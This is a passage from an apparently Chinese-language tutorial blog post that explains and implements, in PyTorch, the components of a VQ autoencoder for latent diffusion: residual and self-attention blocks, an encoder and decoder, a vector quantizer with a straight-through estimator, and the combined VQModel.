class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.conv3 = <span class="literal">None</span></span><br><span class="line">        self.bn1 = nn.BatchNorm2d(num_channels)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(num_channels)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, X</span>):</span><br><span class="line">        Y = F.relu(self.bn1(self.conv1(X)))</span><br><span class="line">        Y = self.bn2(self.conv2(Y))</span><br><span class="line">        <span class="keyword">if</span> self.conv3:</span><br><span class="line">            X = self.conv3(X)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> X.shape != Y.shape:</span><br><span class="line">            <span class="keyword">return</span> F.relu(Y)</span><br><span class="line">        Y += X</span><br><span class="line">        <span class="keyword">return</span> F.relu(Y)</span><br></pre></td></tr></table></figure><h3 id="attention层">Attention层</h3><p>CV的attention存在两种,一种Spatial SelfAttention,一种Channel SelfAttention.</p><p>假设图片维度为HxWxC</p><p>Spatial的做法是1x1卷积层连接所有通道信息构成新图HxWx1,然后对这个新图做SelfAttention, 侧重点在于对图像的平面维度做权重.</p><p>Channel的做法是首先mxn的pool层将信息整合到1x1xC,然后对所有的通道做权重,侧重点在于通道.</p><p>这里我们用的是Spatial Attention.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SelfAttention</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_channels</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line"></span><br><span class="line">        self.norm = torch.nn.GroupNorm(num_groups=<span class="number">32</span>, num_channels=in_channels, eps=<span class="number">1e-6</span>, affine=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 1x1 conv -&gt; spatial attention</span></span><br><span class="line">        self.q = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.k = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.v = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.proj_out = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                        in_channels,</span><br><span class="line">                                        kernel_size=<span class="number">1</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        h_ = x</span><br><span class="line">        h_ = self.norm(h_)</span><br><span class="line">        q = self.q(h_)</span><br><span class="line">        k = self.k(h_)</span><br><span class="line">        v = self.v(h_)</span><br><span class="line">        <span class="comment"># compute attention</span></span><br><span class="line">        b, c, h, w = q.shape</span><br><span class="line">        q = q.reshape(b, c, h * w)</span><br><span class="line">        q = q.permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># b,hw,c</span></span><br><span class="line">        k = k.reshape(b, c, h * w)  <span class="comment"># b,c,hw</span></span><br><span class="line">        w_ = torch.bmm(q, k)  <span class="comment"># b,hw,hw    w[b,i,j]=sum_c q[b,i,c]k[b,c,j]</span></span><br><span class="line">        w_ = w_ * (<span class="built_in">int</span>(c) ** (-<span class="number">0.5</span>))</span><br><span class="line">        w_ = torch.nn.functional.softmax(w_, dim=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># attend to values</span></span><br><span class="line">        v = v.reshape(b, c, h * w)</span><br><span class="line">        w_ = w_.permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># b,hw,hw (first hw of k, second of q)</span></span><br><span class="line">        h_ = torch.bmm(v, w_)  <span class="comment"># b, c,hw (hw of q) h_[b,c,j] = sum_i v[b,c,i] w_[b,i,j]</span></span><br><span class="line">        h_ = h_.reshape(b, c, h, w)</span><br><span class="line"></span><br><span class="line">        h_ = self.proj_out(h_)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x + h_</span><br></pre></td></tr></table></figure><h3 id="upsample-和-downsample">UpSample 和 DownSample</h3><p>encoder会增加输入的通道数:比如把3通道变成128. 然后依据我们提供的Down Sampling Factor $ f $, 每次我们通道数乘以2,宽高除以二. 这里的encode宽高除以2或者decode宽高乘2的部分就是这几个block做的.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UpSampleBlock</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, channels</span>):</span><br><span class="line">        <span class="built_in">super</span>(UpSampleBlock, self).__init__()</span><br><span class="line">        self.conv = nn.Conv2d(channels, channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.interpolate(x, scale_factor=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">return</span> self.conv(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DownSampleBlock</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, channels</span>):</span><br><span class="line">        <span class="built_in">super</span>(DownSampleBlock, self).__init__()</span><br><span class="line">        self.conv = nn.Conv2d(channels, channels, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        pad = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        x = F.pad(x, pad, mode=<span class="string">&quot;constant&quot;</span>, value=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> self.conv(x)</span><br></pre></td></tr></table></figure><h3 id="encoder-decoder">Encoder, Decoder</h3><p>核心部分.</p><p>Encoder工作流程: 输入通道从3变成规定大小, 然后进行宽高压缩以及残差块的连接, 在合适的resolution加入selfattention.</p><p>Decoder工作流程: 首先使用encoder的结尾操作的逆操作(比如encoder末尾还会有ResBlock和AttentionBlock),然后做upsampling和残差块注意力块连接,最后输出通道从规定大小变成3.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Normalize</span>(<span class="params">in_channels, num_groups=<span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">return</span> torch.nn.GroupNorm(num_groups=num_groups, num_channels=in_channels, eps=<span class="number">1e-6</span>, affine=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encoder</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, number_res, f=<span class="number">8</span>, attn_res=<span class="number">32</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialize the class with the given input channels, number of residuals, and down sampling factor f.</span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string">            input_channels (int): The number of input channels.</span></span><br><span class="line"><span class="string">            number_res (int): The number of residuals.</span></span><br><span class="line"><span class="string">            f (int, optional): Down sampling factor with a default value of 8.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.input_channels = input_channels</span><br><span class="line">        self.output_channels = input_channels // f</span><br><span class="line">        self.level = math.log2(f)</span><br><span class="line">        <span class="keyword">if</span> self.level != <span class="built_in">int</span>(self.level):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Down Sampling factor Wrong!&#x27;</span>)</span><br><span class="line">        self.level = <span class="built_in">int</span>(self.level)</span><br><span class="line">        self.block = nn.ModuleList()</span><br><span class="line"></span><br><span class="line">        self.rgb2input_channel = nn.Conv2d(<span class="number">3</span>, input_channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.block.append(self.rgb2input_channel)</span><br><span class="line">        <span class="comment"># down sampling</span></span><br><span class="line">        <span class="comment"># 每一个level维度除以2</span></span><br><span class="line">        curr_output = self.input_channels</span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.level):</span><br><span class="line">            curr_f = <span class="number">2</span> ** i_level</span><br><span class="line">            curr_input = self.input_channels // curr_f</span><br><span class="line">            curr_output = curr_input // <span class="number">2</span></span><br><span class="line">            self.res_sequence = nn.ModuleList()</span><br><span class="line">            <span class="comment"># 每次除以2连接n_res个残差块</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number_res):</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_input, curr_output))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_output, curr_output))</span><br><span class="line">                <span class="comment"># self-attention 收尾</span></span><br><span class="line">                <span class="keyword">if</span> curr_output == attn_res:</span><br><span class="line">                    self.attn = SelfAttention(curr_output)</span><br><span class="line">                    self.res_sequence.append(self.attn)</span><br><span class="line"></span><br><span class="line">            self.block.append(nn.Sequential(*self.res_sequence))</span><br><span class="line">            <span class="keyword">if</span> i_level != self.level - <span class="number">1</span>:</span><br><span class="line">                self.block.append(DownSampleBlock(curr_output))</span><br><span class="line">        <span class="comment"># mid</span></span><br><span class="line">        self.mid = nn.ModuleList()</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line">        self.mid.append(SelfAttention(curr_output))</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        self.end = nn.ModuleList()</span><br><span class="line">        self.end.append(Normalize(curr_output))</span><br><span class="line">        self.conv_out = torch.nn.Conv2d(curr_output, curr_output,</span><br><span class="line">                                        kernel_size=<span class="number">3</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">1</span>)</span><br><span class="line">        self.end.append(self.conv_out)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.block:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.mid:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.end:</span><br><span class="line">            x = layer(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decoder</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, number_res, f=<span class="number">8</span>, attn_res=<span class="number">32</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialize the class with the given input channels, number of residuals, and down sampling factor f.</span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string">            input_channels (int): The number of input channels.</span></span><br><span class="line"><span class="string">            number_res (int): The number of residuals.</span></span><br><span class="line"><span class="string">            f (int, optional): Down sampling factor with a default value of 8.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.input_channels = input_channels</span><br><span class="line">        self.output_channels = input_channels // f</span><br><span class="line">        self.level = math.log2(f)</span><br><span class="line">        <span class="keyword">if</span> self.level != <span class="built_in">int</span>(self.level):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Down Sampling factor Wrong!&#x27;</span>)</span><br><span class="line">        self.level = <span class="built_in">int</span>(self.level)</span><br><span class="line">        self.block = nn.ModuleList()</span><br><span class="line">        <span class="comment"># 每一个level维度除以2</span></span><br><span class="line">        curr_output = self.output_channels</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mid</span></span><br><span class="line">        self.mid = nn.ModuleList()</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line">        self.mid.append(SelfAttention(curr_output))</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># upsampling</span></span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.level):</span><br><span class="line">            curr_f = <span class="number">2</span> ** i_level</span><br><span class="line">            curr_input = self.output_channels * curr_f</span><br><span class="line">            curr_output = curr_input * <span class="number">2</span></span><br><span class="line">            self.res_sequence = nn.ModuleList()</span><br><span class="line">            <span class="comment"># 每次除以2连接n_res个残差块</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number_res):</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_input, curr_output))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_output, curr_output))</span><br><span class="line">                <span class="comment"># self-attention 收尾</span></span><br><span class="line">                <span class="keyword">if</span> curr_output == attn_res:</span><br><span class="line">                    self.attn = SelfAttention(curr_output)</span><br><span class="line">                    self.res_sequence.append(self.attn)</span><br><span class="line">            self.block.append(nn.Sequential(*self.res_sequence))</span><br><span class="line">            <span class="keyword">if</span> i_level != self.level - <span class="number">1</span>:</span><br><span class="line">                self.block.append(UpSampleBlock(curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        self.end = nn.ModuleList()</span><br><span class="line">        self.end.append(Normalize(curr_output))</span><br><span class="line">        self.conv_out = torch.nn.Conv2d(curr_output, curr_output,</span><br><span class="line">                                        kernel_size=<span class="number">3</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">1</span>)</span><br><span class="line">        self.end.append(self.conv_out)</span><br><span class="line"></span><br><span class="line">        self.rgb2input_channel = nn.Conv2d(curr_output, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.end.append(self.rgb2input_channel)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># mid -&gt; upsampling -&gt; end</span></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.mid:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.block:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.end:</span><br><span class="line">            x = layer(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>需要注意attention操作里面的bmm非常容易爆掉cuda,尽量在resolution低一点再加SelfAttention.</p><h3 id="vectorquantizer2">VectorQuantizer2</h3><p>本质就是计算输入到embedding的距离,然后取距离最小的那个vector作为我们的输出z_q, 即向量量子化. 但是这里存在问题:向量量子化会导致无法求取梯度,所以这里我们需要手动进行<a href="https://www.spaces.ac.cn/archives/6760#VQ-VAE">Straight-Through Estimator</a>,这里的链接是VQVAE的,对理解也有好处. 处理完毕之后进行向量返回并且将loss在这里手动返回,即codebook loss.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/taming-transformers/blob/master/taming/modules/vqvae/quantize.py#L213</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VectorQuantizer2</span>(nn.Module):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Improved version over VectorQuantizer, can be used as a drop-in replacement. Mostly</span></span><br><span class="line"><span class="string">    avoids costly matrix multiplications and allows for post-hoc remapping of indices.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> due to a bug the beta term was applied to the wrong term. for</span></span><br><span class="line">    <span class="comment"># backwards compatibility we use the buggy version by default, but you can</span></span><br><span class="line">    <span class="comment"># specify legacy=False to fix it.</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_e, e_dim, beta</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.n_e = n_e</span><br><span class="line">        self.e_dim = e_dim</span><br><span class="line">        self.beta = beta</span><br><span class="line"></span><br><span class="line">        self.embedding = nn.Embedding(self.n_e, self.e_dim)</span><br><span class="line">        self.embedding.weight.data.uniform_(-<span class="number">1.0</span> / self.n_e, <span class="number">1.0</span> / self.n_e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, z</span>):</span><br><span class="line">        <span class="comment"># reshape z -&gt; (batch, height, width, channel) and flatten</span></span><br><span class="line">        z = rearrange(z, <span class="string">&#x27;b c h w -&gt; b h w c&#x27;</span>).contiguous()</span><br><span class="line">        z_flattened = z.view(-<span class="number">1</span>, self.e_dim)</span><br><span class="line">        <span class="comment"># distances from z to embeddings e_j (z - e)^2 = z^2 + e^2 - 2 e * z</span></span><br><span class="line"></span><br><span class="line">        d = torch.<span class="built_in">sum</span>(z_flattened ** <span class="number">2</span>, dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>) + \</span><br><span class="line">            torch.<span class="built_in">sum</span>(self.embedding.weight ** <span class="number">2</span>, dim=<span class="number">1</span>) - <span class="number">2</span> * \</span><br><span class="line">            torch.einsum(<span class="string">&#x27;bd,dn-&gt;bn&#x27;</span>, z_flattened, rearrange(self.embedding.weight, <span class="string">&#x27;n d -&gt; d n&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        min_encoding_indices = torch.argmin(d, dim=<span class="number">1</span>)</span><br><span class="line">        z_q = self.embedding(min_encoding_indices).view(z.shape)</span><br><span class="line">        perplexity = <span class="literal">None</span></span><br><span class="line">        min_encodings = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># compute loss for embedding(buggy version)</span></span><br><span class="line">        loss = torch.mean((z_q.detach() - z) ** <span class="number">2</span>) + self.beta * torch.mean((z_q - z.detach()) ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># preserve gradients</span></span><br><span class="line">        z_q = z + (z_q - z).detach()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># reshape back to match original input shape</span></span><br><span class="line">        z_q = rearrange(z_q, <span class="string">&#x27;b h w c -&gt; b c h w&#x27;</span>).contiguous()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> z_q, loss, (perplexity, min_encodings, min_encoding_indices)</span><br></pre></td></tr></table></figure><h3 id="vqmodel">VQModel</h3><p>最后我们把前面的模块都丢到一块,即VQModel,后续训练也会直接使用VQModel. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/models/autoencoder.py#L14</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VQModel</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_e, e_dim, beta, input_channel, num_res, f=<span class="number">8</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># essential blocks</span></span><br><span class="line">        self.encoder = Encoder(input_channel, num_res, f)</span><br><span class="line">        self.decoder = Decoder(input_channel, num_res, f)</span><br><span class="line">        self.vq = VectorQuantizer2(n_e, e_dim, beta)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># conv layer after quant</span></span><br><span class="line">        self.quant_conv = torch.nn.Conv2d(input_channel // f, e_dim, <span class="number">1</span>)</span><br><span class="line">        self.post_quant_conv = torch.nn.Conv2d(e_dim, input_channel // f, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, x</span>):</span><br><span class="line">        h = self.encoder(x)</span><br><span class="line">        h = self.quant_conv(h)</span><br><span class="line">        <span class="comment"># z_q, loss, (perplexity, min_encodings, min_encoding_indices)</span></span><br><span class="line">        <span class="keyword">return</span> self.vq(h)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, x</span>):</span><br><span class="line">        quant = self.post_quant_conv(x)</span><br><span class="line">        dec = self.decoder(quant)</span><br><span class="line">        <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        quant, diff, (_, _, ind) = self.encode(x)</span><br><span class="line">        dec = self.decode(quant)</span><br><span class="line">        <span class="keyword">return</span> dec, diff</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_last_layer</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.decoder.conv_out.weight</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init_from_ckpt</span>(<span class="params">self, path, ignore_keys=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> ignore_keys <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            ignore_keys = <span class="built_in">list</span>()</span><br><span class="line">        sd = torch.load(path, map_location=<span class="string">&quot;cpu&quot;</span>)[<span class="string">&quot;state_dict&quot;</span>]</span><br><span class="line">        keys = <span class="built_in">list</span>(sd.keys())</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keys:</span><br><span class="line">            <span class="keyword">for</span> ik <span class="keyword">in</span> ignore_keys:</span><br><span class="line">                <span class="keyword">if</span> k.startswith(ik):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Deleting key &#123;&#125; from state_dict.&quot;</span>.<span class="built_in">format</span>(k))</span><br><span class="line">                    <span class="keyword">del</span> sd[k]</span><br><span class="line">        